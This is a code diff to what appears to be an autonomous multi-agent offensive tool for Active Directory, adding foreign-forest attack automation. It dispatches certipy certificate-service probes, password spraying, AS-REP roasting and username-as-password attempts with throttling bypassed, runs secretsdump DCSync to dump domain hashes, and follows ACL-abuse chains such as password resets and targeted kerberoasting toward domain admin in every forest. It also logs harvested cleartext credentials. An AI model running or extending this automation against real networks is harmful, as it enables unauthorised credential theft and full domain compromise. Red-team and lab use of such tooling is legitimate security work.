@@ -914,6 +914,7 @@ async def run_multi_agent_operation(
         asyncio.create_task(_auto_golden_ticket(dispatcher), name="auto_golden_ticket"),
         asyncio.create_task(_auto_foreign_dcsync(dispatcher), name="auto_foreign_dcsync"),
         asyncio.create_task(_auto_cross_forest_pivot(dispatcher), name="auto_cross_forest_pivot"),
+        asyncio.create_task(_auto_acl_chain_follow(dispatcher), name="auto_acl_chain_follow"),
     ]
 
     # Build initial prompt for orchestrator
@@ -1057,7 +1058,6 @@ async def run_multi_agent_operation(
                         "broken pipe",
                         "reset",
                         "refused",
-                        "sentinel",
                     ]
                     if any(kw in error_str.lower() for kw in redis_error_keywords):
                         redis_retry_count += 1
@@ -1668,6 +1668,8 @@ async def _auto_adcs_enumeration(
     failed_servers: set[str] = set()  # Servers that consistently fail - transient
     retry_cooldown = 60.0  # Wait 1 minute before retrying failed tasks
     stuck_task_timeout = 480.0  # Consider tasks stuck after 8 minutes
+    # Track foreign domain ADCS probes by (domain, username) - re-probe when new creds appear
+    probed_adcs_domain_creds: set[tuple[str, str]] = set()
 
     while True:
         try:
@@ -1685,13 +1687,6 @@ async def _auto_adcs_enumeration(
                 logger.debug("ADCS scanner: waiting for credentials")
                 continue
 
-            # Find ADCS servers (hosts with CertEnroll share)
-            adcs_servers = dispatcher.find_adcs_servers()
-
-            if not adcs_servers:
-                logger.debug("ADCS scanner: no ADCS servers detected yet")
-                continue
-
             # Build current domain set (computed from state each iteration)
             _iter_domains: set[str] = set()
             if state.target and state.target.domain:
@@ -1701,6 +1696,9 @@ async def _auto_adcs_enumeration(
                     _iter_domains.add(cred.domain)
 
             current_time = asyncio.get_event_loop().time()
+
+            # Find ADCS servers (hosts with CertEnroll share)
+            adcs_servers = dispatcher.find_adcs_servers()
 
             # Try to enumerate each ADCS server with available credentials
             for server_ip, server_hostname in adcs_servers:
@@ -1800,6 +1798,58 @@ async def _auto_adcs_enumeration(
                         logger.info(f"ADCS enumeration task {task_id} dispatched for {server_ip}")
                     # Only dispatch one task per server per cycle
                     break
+
+            # --- Foreign domain ADCS probing (no CertEnroll share needed) ---
+            # For foreign domains in multi-forest mode, shares may not be enumerated.
+            # Probe DCs directly with certipy find when we have domain credentials.
+            if get_multi_forest_mode():
+                target_domain = (
+                    state.target.domain.lower() if state.target and state.target.domain else ""
+                )
+                for domain in _iter_domains:
+                    domain_lower = domain.lower()
+                    # Skip primary target domain (already handled via CertEnroll detection)
+                    if domain_lower == target_domain:
+                        continue
+                    # Need a DC IP for this domain
+                    dc_ip = state.domain_controllers.get(domain_lower)
+                    if not dc_ip:
+                        continue
+                    # Skip if we already enumerated this DC via CertEnroll path
+                    if dc_ip in state.processed_adcs_servers:
+                        continue
+                    # Find credentials for this domain (prefer same-domain, then admin)
+                    # Try each credential we haven't probed with yet
+                    for cred in sorted(
+                        [c for c in state.all_credentials if c.password],
+                        key=lambda c: (
+                            0 if (c.domain or "").lower() == domain_lower else 1,
+                            0 if c.is_admin else 1,
+                        ),
+                    ):
+                        probe_key = (domain_lower, cred.username.lower())
+                        if probe_key in probed_adcs_domain_creds:
+                            continue
+
+                        logger.info(
+                            f"🔐 Auto-ADCS: Probing foreign domain {domain} DC {dc_ip} "
+                            f"with {cred.domain}\\{cred.username} (no CertEnroll needed)"
+                        )
+                        task_id = await dispatcher.request_adcs_enumeration(
+                            source_agent="orchestrator",
+                            target_ip=dc_ip,
+                            domain=domain,
+                            username=cred.username,
+                            password=cred.password,
+                        )
+                        probed_adcs_domain_creds.add(probe_key)
+                        if task_id:
+                            logger.info(
+                                f"ADCS foreign domain probe task {task_id} dispatched "
+                                f"for {domain} with {cred.username}"
+                            )
+                        # Only dispatch one probe per domain per cycle
+                        break
 
         except asyncio.CancelledError:
             break
@@ -2190,6 +2240,12 @@ async def _auto_credential_access(
     while True:
         try:
             state = dispatcher.shared_state
+            logger.debug(
+                f"🔄 _auto_credential_access loop tick: "
+                f"hosts={len(state.all_hosts)}, creds={len(state.all_credentials)}, "
+                f"hashes={len(state.all_hashes)}, "
+                f"multi_forest={get_multi_forest_mode()}"
+            )
 
             if _should_stop_background_task(state):
                 logger.debug("Operation complete, stopping auto credential access")
@@ -2261,6 +2317,13 @@ async def _auto_credential_access(
                 and not state.all_hashes
                 and any(d.lower() not in state.processed_asrep_domains for d in _iter_domains)
             )
+            # Check if any foreign domains need AS-REP/spray dispatch
+            has_unprocessed_foreign = False
+            if (state.all_credentials or state.all_hashes) and get_multi_forest_mode():
+                _foreign_domains = state.get_undominated_forests()
+                has_unprocessed_foreign = any(
+                    fd.lower() not in state.processed_asrep_domains for fd in _foreign_domains
+                )
             # Check if any domain has users but hasn't had password spray run yet
             has_unsprayed_users = any(
                 d.lower() not in state.processed_password_spray
@@ -2268,13 +2331,30 @@ async def _auto_credential_access(
                 for d in _iter_domains
             )
 
+            logger.debug(
+                f"🔄 cred-access gate values: new_creds={has_new_creds}, "
+                f"new_hashes={has_new_hashes}, new_cracks={has_new_cracks}, "
+                f"new_domains={has_new_domains}, unsprayed={has_unsprayed_users}, "
+                f"unprocessed_foreign={has_unprocessed_foreign}, "
+                f"processed_asrep={state.processed_asrep_domains}"
+            )
             if not (
                 has_new_creds
                 or has_new_hashes
                 or has_new_cracks
                 or has_new_domains
                 or has_unsprayed_users
+                or has_unprocessed_foreign
             ):
+                if has_unprocessed_foreign is False and get_multi_forest_mode():
+                    _undom = state.get_undominated_forests()
+                    if _undom:
+                        logger.info(
+                            f"🌲 cred-access gate: undominated={_undom}, "
+                            f"processed_asrep={state.processed_asrep_domains}, "
+                            f"has_new_creds={has_new_creds}, has_new_hashes={has_new_hashes}, "
+                            f"has_new_domains={has_new_domains}, _iter_domains={_iter_domains}"
+                        )
                 await dispatcher.wait_for_credential_access_signal(check_interval)
                 continue
 
@@ -2311,28 +2391,108 @@ async def _auto_credential_access(
             # need their own AS-REP/password spray/user enum pass)
             if state.all_credentials or state.all_hashes:
                 foreign_domains = state.get_undominated_forests() if get_multi_forest_mode() else []
+                if foreign_domains:
+                    logger.info(
+                        f"🌲 Foreign AS-REP check: domains={foreign_domains}, "
+                        f"processed_asrep={state.processed_asrep_domains}, "
+                        f"hosts_by_domain_keys={list(_iter_hosts_by_domain.keys())}"
+                    )
                 for fd in foreign_domains:
                     if fd.lower() in state.processed_asrep_domains:
                         continue
                     fd_hosts = _iter_hosts_by_domain.get(fd.lower(), [])
                     if not fd_hosts:
+                        # Fallback: use DC IP from domain_controllers or dc_map
+                        dc_ip = state.domain_controllers.get(fd.lower())
+                        if dc_ip:
+                            fd_hosts = [dc_ip]
+                    if not fd_hosts:
+                        # DNS SRV fallback to discover DC
+                        try:
+                            srv_cmd = ["dig", "+short", f"_ldap._tcp.{fd.lower()}", "SRV"]
+                            srv_out, _, srv_rc = await _async_run_tool(srv_cmd, timeout_seconds=10)
+                            if srv_rc == 0 and srv_out and srv_out.strip():
+                                for line in srv_out.strip().split("\n"):
+                                    parts = line.split()
+                                    if len(parts) >= 4:
+                                        dc_hostname = parts[3].rstrip(".")
+                                        a_cmd = ["dig", "+short", dc_hostname, "A"]
+                                        a_out, _, a_rc = await _async_run_tool(
+                                            a_cmd, timeout_seconds=10
+                                        )
+                                        if a_rc == 0 and a_out and a_out.strip():
+                                            resolved_ip = a_out.strip().split("\n")[0]
+                                            fd_hosts = [resolved_ip]
+                                            state.domain_controllers[fd.lower()] = resolved_ip
+                                            from ares.core.models import Host
+
+                                            state.add_host(
+                                                Host(
+                                                    ip=resolved_ip,
+                                                    hostname=dc_hostname,
+                                                    is_dc=True,
+                                                )
+                                            )
+                                            logger.info(
+                                                f"Resolved foreign DC via DNS: {dc_hostname} ({resolved_ip})"
+                                            )
+                                            break
+                        except Exception:
+                            pass
+                    if not fd_hosts:
                         continue
-                    fruit_task_id = await dispatcher.request_credential_access(
-                        source_agent="orchestrator",
-                        domain=fd,
-                        target_ips=fd_hosts,
-                        reason="low_hanging_fruit_foreign_domain",
-                        techniques=[
+                    # Bypass throttler — foreign domain recon is critical path
+                    # and must not be deferred behind primary domain tasks
+                    #
+                    # Include a valid cross-forest credential so the agent can
+                    # authenticate to the foreign DC via trust and use
+                    # -target-domain for AS-REP/Kerberoast enumeration.
+                    cross_cred = next(
+                        (
+                            c
+                            for c in state.all_credentials
+                            if c.password and (c.domain or "").lower() != fd.lower()
+                        ),
+                        None,
+                    )
+                    fd_payload: dict[str, object] = {
+                        "domain": fd,
+                        "target_ips": fd_hosts,
+                        "reason": "low_hanging_fruit_foreign_domain",
+                        "techniques": [
                             "username_as_password",
                             "password_spray",
                             "asrep_roast",
                         ],
-                    )
-                    state.processed_asrep_domains.add(fd.lower())
-                    if fruit_task_id:
-                        logger.info(
-                            f"Auto credential access (low-hanging fruit) dispatched for foreign domain {fd}"
+                    }
+                    if cross_cred:
+                        fd_payload["username"] = cross_cred.username
+                        fd_payload["password"] = cross_cred.password
+                        fd_payload["credential_domain"] = cross_cred.domain
+                        fd_payload["note"] = (
+                            f"CROSS-FOREST: credential {cross_cred.username} is from "
+                            f"{cross_cred.domain}, NOT from {fd}. You MUST pass "
+                            f"credential_domain='{cross_cred.domain}' to asrep_roast() "
+                            f"and kerberoast() for cross-domain enumeration via trust."
                         )
+                        logger.info(
+                            f"🌲 Including cross-forest credential "
+                            f"{cross_cred.username}@{cross_cred.domain} "
+                            f"for foreign domain {fd} enumeration"
+                        )
+                    if dispatcher._task_queue:
+                        fruit_task_id = await dispatcher._task_queue.submit_task(
+                            task_type="credential_access",
+                            target_role="credential_access",
+                            payload=fd_payload,
+                            source_agent="orchestrator",
+                            priority=2,
+                        )
+                        logger.info(
+                            f"🌲 Foreign domain AS-REP/spray submitted directly "
+                            f"(bypassed throttle) for {fd}: {fruit_task_id}"
+                        )
+                    state.processed_asrep_domains.add(fd.lower())
 
             # Check for new users without credentials - run username_as_password on them
             # This catches cases like testuser:testuser where username equals password
@@ -5250,13 +5410,65 @@ async def _auto_foreign_dcsync(
                 # Find DC IP for this foreign domain
                 dc_ip = state.domain_controllers.get(fd_lower)
                 if not dc_ip:
-                    # Try to find from hosts
+                    # Try to find from hosts (check is_dc flag)
                     for host in state.all_hosts:
                         if host.is_dc and host.hostname:
                             h_domain = ".".join(host.hostname.lower().split(".")[1:])
                             if h_domain == fd_lower and host.ip:
                                 dc_ip = host.ip
                                 break
+                if not dc_ip:
+                    # Try ANY host in the foreign domain (may be DC even without flag)
+                    for host in state.all_hosts:
+                        if host.hostname and "." in host.hostname:
+                            h_domain = host.hostname.lower().split(".", 1)[-1]
+                            if h_domain == fd_lower and host.ip:
+                                dc_ip = host.ip
+                                logger.info(
+                                    f"🌲 Auto-foreign-dcsync: using host {host.hostname} "
+                                    f"({host.ip}) as potential DC for {foreign_domain}"
+                                )
+                                break
+                if not dc_ip:
+                    # DNS SRV fallback: resolve _ldap._tcp.<domain>
+                    try:
+                        srv_cmd = ["dig", "+short", f"_ldap._tcp.{fd_lower}", "SRV"]
+                        srv_out, _, srv_rc = await _async_run_tool(srv_cmd, timeout_seconds=10)
+                        if srv_rc == 0 and srv_out and srv_out.strip():
+                            # SRV format: priority weight port target
+                            for line in srv_out.strip().split("\n"):
+                                parts = line.split()
+                                if len(parts) >= 4:
+                                    dc_hostname = parts[3].rstrip(".")
+                                    # Resolve hostname to IP
+                                    a_cmd = ["dig", "+short", dc_hostname, "A"]
+                                    a_out, _, a_rc = await _async_run_tool(
+                                        a_cmd, timeout_seconds=10
+                                    )
+                                    if a_rc == 0 and a_out and a_out.strip():
+                                        dc_ip = a_out.strip().split("\n")[0]
+                                        state.domain_controllers[fd_lower] = dc_ip
+                                        # Also add as a host
+                                        from ares.core.models import Host
+
+                                        state.add_host(
+                                            Host(
+                                                ip=dc_ip,
+                                                hostname=dc_hostname,
+                                                is_dc=True,
+                                            )
+                                        )
+                                        logger.info(
+                                            f"🌲 Auto-foreign-dcsync: resolved DC for "
+                                            f"{foreign_domain} via DNS SRV: "
+                                            f"{dc_hostname} ({dc_ip})"
+                                        )
+                                        break
+                    except Exception as dns_err:
+                        logger.debug(
+                            f"🌲 Auto-foreign-dcsync: DNS SRV lookup failed "
+                            f"for {foreign_domain}: {dns_err}"
+                        )
                 if not dc_ip:
                     logger.info(f"🌲 Auto-foreign-dcsync: no DC IP for {foreign_domain}, skipping")
                     continue
@@ -5296,13 +5508,21 @@ async def _auto_foreign_dcsync(
                         f"{cred.domain}/{cred.username}:{cred.password}@{dc_ip}",
                         "-just-dc",
                     ]
-                    stdout, stderr, _rc = await _async_run_tool(cmd, timeout_seconds=300)
+                    stdout, stderr, rc = await _async_run_tool(cmd, timeout_seconds=300)
                     output = (stdout or "") + "\n" + (stderr or "")
+
+                    logger.info(
+                        f"🌲 Auto-foreign-dcsync: secretsdump on {dc_ip} with "
+                        f"{cred.username}@{cred.domain} rc={rc}, "
+                        f"output_len={len(output)}, "
+                        f"first_200={output[:200]!r}"
+                    )
 
                     if not output.strip():
                         logger.warning(
                             f"🌲 Auto-foreign-dcsync: empty output from secretsdump on {dc_ip}"
                         )
+                        state.processed_foreign_dcsync.add(dedup_key)
                         continue
 
                     # Parse Administrator hash
@@ -6066,12 +6286,14 @@ async def _auto_acl_chain_follow(
     2. Dispatches tasks for each step
     3. Re-authenticates with new credentials
     4. Continues until DA is achieved
+    5. Creates chains from acl_abuse vulnerabilities
+    6. Detects when targeted_kerberoast steps yield cracked credentials
 
     Args:
         dispatcher: The dispatcher instance
         check_interval: Seconds between chain progress checks
     """
-    from ares.core.dispatcher.acl_chains import ACLChainTracker
+    from ares.core.dispatcher.acl_chains import ACLAction, ACLChainTracker
 
     state = dispatcher.shared_state
 
@@ -6082,6 +6304,8 @@ async def _auto_acl_chain_follow(
         dispatcher._acl_chain_tracker.set_state(state)
 
     tracker: ACLChainTracker = dispatcher._acl_chain_tracker
+    # Track which vulns we've already created chains for
+    vuln_chains_created: set[str] = set()
 
     while True:
         try:
@@ -6090,11 +6314,65 @@ async def _auto_acl_chain_follow(
             # Re-read state each iteration for latest tracking
             state = dispatcher.shared_state
 
-            # Skip if DA already achieved
-            if state.has_domain_admin:
+            # Skip if DA achieved AND all forests dominated (or not multi-forest)
+            if state.has_domain_admin and (
+                not get_multi_forest_mode() or state.all_forests_dominated()
+            ):
                 continue
 
-            # Check for chains that need progress
+            # --- Phase 1: Create chains from acl_abuse vulnerabilities ---
+            # This converts discovered ACL vulns into executable chains
+            acl_vuln_types = {
+                "acl_abuse",
+                "genericall_domain_admins",
+                "adminsd_holder_acl",
+                "gpo_write",
+            }
+            for vuln in list(state.discovered_vulnerabilities.values()):
+                if vuln.vuln_type not in acl_vuln_types:
+                    continue
+                vuln_key = f"{vuln.vuln_type}:{vuln.target}:{vuln.details.get('principal', '')}"
+                if vuln_key in vuln_chains_created:
+                    continue
+                principal = vuln.details.get("principal", "")
+                if not principal:
+                    continue
+                # Determine target type from vuln details
+                target_type = vuln.details.get("target_type", "user")
+                if vuln.vuln_type == "genericall_domain_admins":
+                    target_type = "group"
+                # Determine right from description or default to GenericAll
+                right = "GenericAll"
+                desc = vuln.details.get("description", "").lower()
+                if "genericwrite" in desc:
+                    right = "GenericWrite"
+                elif "writedacl" in desc:
+                    right = "WriteDacl"
+                elif "writeowner" in desc:
+                    right = "WriteOwner"
+                elif "forcechangepassword" in desc:
+                    right = "ForceChangePassword"
+
+                domain = vuln.details.get("domain", "")
+                if not domain and state.target:
+                    domain = state.target.domain or ""
+
+                chain = tracker.create_single_step_chain(
+                    principal=principal,
+                    target=vuln.target,
+                    right=right,
+                    domain=domain,
+                    target_type=target_type,
+                    discovered_by="vulnerability",
+                )
+                vuln_chains_created.add(vuln_key)
+                if chain:
+                    logger.info(
+                        f"🔗 Auto-created ACL chain from {vuln.vuln_type} vuln: "
+                        f"{principal} -> {vuln.target}"
+                    )
+
+            # --- Phase 2: Progress existing chains ---
             for chain in list(tracker.chains.values()):
                 if chain.is_complete:
                     continue
@@ -6104,7 +6382,53 @@ async def _auto_acl_chain_follow(
                     continue
 
                 step_key = f"{chain.chain_id}:{current_step.step_id}"
+
+                # Check if already-dispatched step has completed via credential discovery
+                # This handles targeted_kerberoast → crack → credential flow and
+                # other async steps where the result comes via publish_credential
                 if step_key in state.dispatched_acl_steps:
+                    if not current_step.completed:
+                        # For targeted_kerberoast: check if target's credential was cracked
+                        if current_step.action == ACLAction.TARGETED_KERBEROAST:
+                            for cred in state.all_credentials:
+                                if (
+                                    cred.username.lower() == current_step.target.lower()
+                                    and cred.password
+                                ):
+                                    tracker.mark_step_completed(
+                                        chain.chain_id,
+                                        current_step.step_id,
+                                        "Credential obtained via targeted kerberoast + crack",
+                                        {
+                                            "username": cred.username,
+                                            "password": cred.password,
+                                            "domain": cred.domain or chain.domain,
+                                        },
+                                    )
+                                    logger.info(
+                                        f"🔗 ACL chain {chain.chain_id}: targeted_kerberoast step "
+                                        f"auto-completed - {current_step.target} credential cracked"
+                                    )
+                                    break
+                        # For reset_password: check if target has new password in state
+                        elif current_step.action == ACLAction.RESET_PASSWORD:
+                            for cred in state.all_credentials:
+                                if (
+                                    cred.username.lower() == current_step.target.lower()
+                                    and cred.password
+                                    and cred.source == "acl_chain"
+                                ):
+                                    tracker.mark_step_completed(
+                                        chain.chain_id,
+                                        current_step.step_id,
+                                        "Password reset completed",
+                                        {
+                                            "username": cred.username,
+                                            "password": cred.password,
+                                            "domain": cred.domain or chain.domain,
+                                        },
+                                    )
+                                    break
                     continue
 
                 # Check if we have credentials for the source user
@@ -6167,9 +6491,6 @@ async def _auto_acl_chain_follow(
                     logger.info(f"Dispatched ACL chain step: {task_id}")
                 except Exception as e:
                     logger.warning(f"🔗 Failed to dispatch ACL chain step: {e}")
-
-            # Check for newly discovered chains from BloodHound output
-            # (This is handled in result_processing via extract_acl_chains_from_bloodhound)
 
         except asyncio.CancelledError:
             break
